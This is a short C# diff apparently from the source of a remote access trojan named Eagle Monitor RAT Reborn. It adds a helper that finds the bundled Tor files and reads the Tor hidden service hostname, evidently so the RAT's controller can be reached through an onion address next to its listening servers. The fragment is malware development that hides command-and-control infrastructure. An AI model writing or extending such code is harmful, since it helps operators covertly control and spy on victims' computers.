@@ -200,6 +200,16 @@ namespace Eagle_Monitor_RAT_Reborn.Misc
             return (Image)(new Bitmap(imgToResize, size));
         }
 
+        internal static string GrabOnionName()
+        {
+            string[] _dirs = Directory.GetDirectories(Application.StartupPath + "\\TORFiles\\TorExtracted");
+            string _ = "";
+            foreach (string _dir in _dirs)
+                if (_dir.Contains("tor"))
+                    _ = _dir;
+            return File.ReadAllText($"{_}\\Data\\Tor\\HiddenService\\hostname").Trim();
+        }
+
         internal static void StartServers() 
         {
             foreach (int p in Program.settings.ports)
